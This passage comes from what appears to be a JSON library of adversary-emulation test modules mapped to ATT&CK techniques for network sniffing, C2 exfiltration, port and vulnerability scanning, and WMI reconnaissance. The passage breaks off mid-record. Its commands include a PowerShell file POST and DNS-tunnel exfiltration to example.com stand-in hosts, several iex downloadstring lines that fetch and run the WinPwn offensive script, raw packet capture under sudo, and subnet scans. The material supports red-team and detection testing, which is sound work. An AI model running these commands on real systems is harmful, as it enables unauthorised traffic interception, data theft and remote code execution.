      "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo #{program_path} -i #{ifname} -t 3\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{program_path}\n"
      },
      "variables": [
        {
          "name": "ifname",
          "description": "Specify interface to perform PCAP on.",
          "type": "string",
          "default_value": "en0"
        },
        {
          "name": "csource_path",
          "description": "Path to C program source",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1040/src/macos_pcapdemo.c"
        },
        {
          "name": "program_path",
          "description": "Path to compiled C program",
          "type": "string",
          "default_value": "/tmp/t1040_macos_pcapdemo"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "exit 1\n",
          "install_command": "cc #{csource_path} -o #{program_path}\n"
        }
      ],
      "rx_module_id": "e6fe5095-545d-4c8b-a0ae-e863914be3aa",
      "module_name": "Packet Capture macOS using /dev/bpfN with sudo"
    },
    {
      "index": 206,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo #{program_path} -f -i #{ifname} -t 3\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{program_path}\n"
      },
      "variables": [
        {
          "name": "ifname",
          "description": "Specify interface to perform PCAP on.",
          "type": "string",
          "default_value": "en0"
        },
        {
          "name": "csource_path",
          "description": "Path to C program source",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1040/src/macos_pcapdemo.c"
        },
        {
          "name": "program_path",
          "description": "Path to compiled C program",
          "type": "string",
          "default_value": "/tmp/t1040_macos_pcapdemo"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "exit 1\n",
          "install_command": "cc #{csource_path} -o #{program_path}\n"
        }
      ],
      "rx_module_id": "e2480aee-23f3-4f34-80ce-de221e27cd19",
      "module_name": "Filtered Packet Capture macOS using /dev/bpfN with sudo"
    },
    {
      "index": 207,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo #{program_path} -i #{ifname} -t 3\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{program_path}\n"
      },
      "variables": [
        {
          "name": "ifname",
          "description": "Specify interface to perform PCAP on.",
          "type": "string",
          "default_value": "em0"
        },
        {
          "name": "csource_path",
          "description": "Path to C program source",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1040/src/freebsd_pcapdemo.c"
        },
        {
          "name": "program_path",
          "description": "Path to compiled C program",
          "type": "string",
          "default_value": "/tmp/t1040_freebsd_pcapdemo"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "exit 1\n",
          "install_command": "cc #{csource_path} -o #{program_path}\n"
        }
      ],
      "rx_module_id": "e2028771-1bfb-48f5-b5e6-e50ee0942a14",
      "module_name": "Packet Capture FreeBSD using /dev/bpfN with sudo"
    },
    {
      "index": 208,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo #{program_path} -f -i #{ifname} -t 3\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{program_path}\n"
      },
      "variables": [
        {
          "name": "ifname",
          "description": "Specify interface to perform PCAP on.",
          "type": "string",
          "default_value": "em0"
        },
        {
          "name": "csource_path",
          "description": "Path to C program source",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1040/src/freebsd_pcapdemo.c"
        },
        {
          "name": "program_path",
          "description": "Path to compiled C program",
          "type": "string",
          "default_value": "/tmp/t1040_freebsd_pcapdemo"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "exit 1\n",
          "install_command": "cc #{csource_path} -o #{program_path}\n"
        }
      ],
      "rx_module_id": "a3a0d4c9-c068-4563-a08d-583bd05b884c",
      "module_name": "Filtered Packet Capture FreeBSD using /dev/bpfN with sudo"
    },
    {
      "index": 209,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo #{program_path} -a -t 3\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{program_path}\n"
      },
      "variables": [
        {
          "name": "csource_path",
          "description": "Path to C program source",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1040/src/linux_pcapdemo.c"
        },
        {
          "name": "program_path",
          "description": "Path to compiled C program",
          "type": "string",
          "default_value": "/tmp/t1040_linux_pcapdemo"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "cc #{csource_path} -o #{program_path}\n"
        }
      ],
      "rx_module_id": "10c710c9-9104-4d5f-8829-5b65391e2a29",
      "module_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo"
    },
    {
      "index": 210,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo #{program_path} -4 -p 6 -t 3\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{program_path}\n"
      },
      "variables": [
        {
          "name": "csource_path",
          "description": "Path to C program source",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1040/src/linux_pcapdemo.c"
        },
        {
          "name": "program_path",
          "description": "Path to compiled C program",
          "type": "string",
          "default_value": "/tmp/t1040_linux_pcapdemo"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "cc #{csource_path} -o #{program_path}\n"
        }
      ],
      "rx_module_id": "7a0895f0-84c1-4adf-8491-a21510b1d4c1",
      "module_name": "Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo"
    },
    {
      "index": 211,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo #{program_path} -4 -P -p 17 -t 3\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{program_path}\n"
      },
      "variables": [
        {
          "name": "csource_path",
          "description": "Path to C program source",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1040/src/linux_pcapdemo.c"
        },
        {
          "name": "program_path",
          "description": "Path to compiled C program",
          "type": "string",
          "default_value": "/tmp/t1040_linux_pcapdemo"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "cc #{csource_path} -o #{program_path}\n"
        }
      ],
      "rx_module_id": "515575ab-d213-42b1-aa64-ef6a2dd4641b",
      "module_name": "Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo"
    },
    {
      "index": 212,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.\nSets a BPF filter on the socket to filter for UDP traffic.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo #{program_path} -a -f -t 3\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{program_path}\n"
      },
      "variables": [
        {
          "name": "csource_path",
          "description": "Path to C program source",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1040/src/linux_pcapdemo.c"
        },
        {
          "name": "program_path",
          "description": "Path to compiled C program",
          "type": "string",
          "default_value": "/tmp/t1040_linux_pcapdemo"
        }
      ],
      "prerequisites": [
        {
          "description": "compile C program\n",
          "check_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "cc #{csource_path} -o #{program_path}\n"
        }
      ],
      "rx_module_id": "b1cbdf8b-6078-48f5-a890-11ea19d7f8e9",
      "module_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo"
    },
    {
      "index": 213,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "PowerShell Built-in Cmdlets to capture network traffic.\nhttps://learn.microsoft.com/en-us/powershell/module/neteventpacketcapture/new-neteventsession?view=windowsserver2022-ps",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\"\nAdd-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100\nStart-NetEventSession -Name Capture007\nStop-NetEventSession -Name Capture007\nRemove-NetEventSession -Name Capture007\n",
        "elevation_required": true,
        "cleanup_command": "del $ENV:Temp\\sniff.etl"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9c15a7de-de14-46c3-bc2a-6d94130986ae",
      "module_name": "PowerShell Network Sniffing"
    },
    {
      "index": 214,
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "description": "Exfiltrates a file present on the victim machine to the C2 server.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "destination_url",
          "description": "Destination URL to post encoded data.",
          "type": "string",
          "default_value": "example.com"
        },
        {
          "name": "filepath",
          "description": "The file which is being exfiltrated to the C2 Server.",
          "type": "path",
          "default_value": "$env:TEMP\\LineNumbers.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d1253f6e-c29b-49dc-b466-2147a6191932",
      "module_name": "C2 Data Exfiltration"
    },
    {
      "index": 215,
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "description": "Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$dnsServer = \"#{dns_server}\"\n$exfiltratedData = \"#{exfiltrated_data}\"\n$chunkSize = #{chunk_size}\n\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\n$encodedData = [Convert]::ToBase64String($encodedData)\n$chunks = $encodedData -split \"(.{$chunkSize})\"\n\nforeach ($chunk in $chunks) {\n    $dnsQuery = $chunk + \".\" + $dnsServer\n    Resolve-DnsName -Name $dnsQuery\n    Start-Sleep -Seconds 5\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dns_server",
          "description": "DNS server IP address or domain name.",
          "type": "url",
          "default_value": "dns.example.com"
        },
        {
          "name": "exfiltrated_data",
          "description": "Data to be exfiltrated.",
          "type": "string",
          "default_value": "SecretDataToExfiltrate"
        },
        {
          "name": "chunk_size",
          "description": "Size of each DNS query chunk (in characters).",
          "type": "integer",
          "default_value": 63
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c9207f3e-213d-4cc7-ad2a-7697a7237df9",
      "module_name": "Text Based Data Exfiltration using DNS subdomains"
    },
    {
      "index": 216,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "host",
          "description": "Host to scan.",
          "type": "string",
          "default_value": "192.168.1.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "68e907da-2539-48f6-9fc9-257a78c05540",
      "module_name": "Port Scan"
    },
    {
      "index": 217,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Scan ports to check for listening ports with Nmap.\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "host",
          "description": "Host to scan.",
          "type": "string",
          "default_value": "192.168.1.1"
        },
        {
          "name": "port",
          "description": "Ports to scan.",
          "type": "string",
          "default_value": "80"
        },
        {
          "name": "network_range",
          "description": "Network Range to Scan.",
          "type": "string",
          "default_value": "192.168.1.0/24"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if nmap command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "(which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)\n"
        },
        {
          "description": "Check if nc command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v nc)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "(which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)||(which pkg && pkg install -y netcat)\n"
        },
        {
          "description": "Check if telnet command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v telnet)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "(which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n"
        }
      ],
      "rx_module_id": "515942b0-a09f-4163-a7bb-22fefb6f185f",
      "module_name": "Port Scan Nmap"
    },
    {
      "index": 218,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Scan ports to check for listening ports for the local host 127.0.0.1",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "nmap #{host_to_scan}",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "nmap_url",
          "description": "NMap installer download URL",
          "type": "url",
          "default_value": "https://nmap.org/dist/nmap-7.80-setup.exe"
        },
        {
          "name": "host_to_scan",
          "description": "The host to scan with NMap",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [
        {
          "description": "NMap must be installed\n",
          "check_command": "if (cmd /c \"nmap 2>nul\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" #{nmap_url}\nStart-Process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" /S\n"
        }
      ],
      "rx_module_id": "d696a3cb-d7a8-4976-8eb5-5af4abf2e3df",
      "module_name": "Port Scan NMap for Windows"
    },
    {
      "index": 219,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Scan ports to check for listening ports with python\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "python \"#{filename}\" -i #{host_ip}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "host_ip",
          "description": "Host to scan.",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "filename",
          "description": "Location of the project file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1046\\src\\T1046.py"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if python exists on the machine\n",
          "check_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
        }
      ],
      "rx_module_id": "6ca45b04-9f15-4424-b9d3-84a217285a5c",
      "module_name": "Port Scan using python"
    },
    {
      "index": 220,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "54574908-f1de-4356-9021-8053dd57439a",
      "module_name": "WinPwn - spoolvulnscan"
    },
    {
      "index": 221,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "97585b04-5be2-40e9-8c31-82157b8af2d6",
      "module_name": "WinPwn - MS17-10"
    },
    {
      "index": 222,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1cca5640-32a9-46e6-b8e0-fabbe2384a73",
      "module_name": "WinPwn - bluekeep"
    },
    {
      "index": 223,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bb037826-cbe8-4a41-93ea-b94059d6bb98",
      "module_name": "WinPwn - fruit"
    },
    {
      "index": 224,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "sh",
        "command": "docker build -t t1046 $PathToRagloxModulesFolder/T1046/src/\ndocker run --name t1046_container --rm -d -t t1046\ndocker exec t1046_container /scan.sh",
        "elevation_required": false,
        "cleanup_command": "docker stop t1046_container\ndocker rmi -f t1046"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify docker is installed.",
          "check_command": "which docker\n",
          "install_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
        },
        {
          "description": "Verify docker service is running.",
          "check_command": "sudo systemctl status docker  --no-pager\n",
          "install_command": "sudo systemctl start docker\n"
        }
      ],
      "rx_module_id": "06eaafdb-8982-426e-8a31-d572da633caa",
      "module_name": "Network Service Discovery for Containers"
    },
    {
      "index": 225,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the raglox might not print any output until the scans are completed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$ipAddr = \"#{ip_address}\"\nif ($ipAddr -like \"*,*\") {\n    $ip_list = $ipAddr -split \",\"\n    $ip_list = $ip_list.ForEach({ $_.Trim() })\n    Write-Host \"[i] IP Address List: $ip_list\"\n\n    $ports = #{port_list}\n\n    foreach ($ip in $ip_list) {\n        foreach ($port in $ports) {\n            Write-Host \"[i] Establishing connection to: $ip : $port\"\n            try {\n                $tcp = New-Object Net.Sockets.TcpClient\n                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n            } catch {}\n            if ($tcp.Connected) {\n                $tcp.Close()\n                Write-Host \"Port $port is open on $ip\"\n            }\n        }\n    }\n} elseif ($ipAddr -notlike \"*,*\") {\n    if ($ipAddr -eq \"\") {\n        # Assumes the \"primary\" interface is shown at the top\n        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n        Write-Host \"[i] Using Interface $interface\"\n        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n    }\n    Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"\n    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n    # Always assumes /24 subnet\n    Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"\n\n    $ports = #{port_list}\n    $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }\n\n    foreach ($ip in $subnetIPs) {\n        foreach ($port in $ports) {\n            try {\n                $tcp = New-Object Net.Sockets.TcpClient\n                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n            } catch {}\n            if ($tcp.Connected) {\n                $tcp.Close()\n                Write-Host \"Port $port is open on $ip\"\n            }\n        }\n    }\n} else {\n    Write-Host \"[Error] Invalid Inputs\"\n    exit 1\n}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ip_address",
          "description": "IP-Address within the target subnet. Default is empty and script tries to determine local IP address of attacking machine. A comma separated list of targe IPs is also accepted (useful to simulate a wider scan while only scanning key host e.g., honeypots)",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "port_list",
          "description": "Comma separated list of ports to scan",
          "type": "string",
          "default_value": "445, 3389"
        },
        {
          "name": "timeout_ms",
          "description": "Connection timeout in milliseconds",
          "type": "string",
          "default_value": "200"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "05df2a79-dba6-4088-a804-9ca0802ca8e4",
      "module_name": "Port-Scanning /24 Subnet with PowerShell"
    },
    {
      "index": 226,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Availability of remote desktop services can be checked using get- cmdlet of PowerShell\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9e55750e-4cbf-4013-9627-e9a045b541bf",
      "module_name": "Remote Desktop Services Discovery via PowerShell"
    },
    {
      "index": 227,
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "description": "Scan multiple ports to check for listening ports with nmap\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "nmap -Pn -sV -p #{port_range} #{host}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "host",
          "description": "Host(s) to scan.",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "port_range",
          "description": "Port range(s) to scan.",
          "type": "string",
          "default_value": "0-65535"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if nmap command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "(which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)||(which brew && brew install nmap)\n"
        }
      ],
      "rx_module_id": "0d5a2b03-3a26-45e4-96ae-89485b4d1f97",
      "module_name": "Port Scan using nmap (Port range)"
    },
    {
      "index": 228,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic useraccount get /ALL /format:csv\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c107778c-dcf5-47c5-af2e-1d058a3df3ea",
      "module_name": "WMI Reconnaissance Users"
    },
    {
      "index": 229,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic process get caption,executablepath,commandline /format:csv\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5750aa16-0e59-4410-8b9a-8a47ca2788e2",
      "module_name": "WMI Reconnaissance Processes"
    },
    {
      "index": 230,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic qfe get description,installedOn /format:csv\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "718aebaa-d0e0-471a-8241-c5afa69c7414",
      "module_name": "WMI Reconnaissance Software"
    },
    {
      "index": 231,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreachable\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "node",
          "description": "Ip Address",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "service_search_string",
          "description": "Name Of Service",
          "type": "string",
          "default_value": "Spooler"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0fd48ef7-d890-4e93-a533-f7dedd5191d3",
      "module_name": "WMI Reconnaissance List Remote Services"
    },
    {
      "index": 232,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic process call create #{process_to_execute}\n",
        "elevation_required": false,
        "cleanup_command": "wmic process where name='#{process_to_execute}' delete >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "process_to_execute",
          "description": "Name or path of process to execute.",
          "type": "string",
          "default_value": "notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3",
      "module_name": "WMI Execute Local Process"
    },
    {
      "index": 233,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
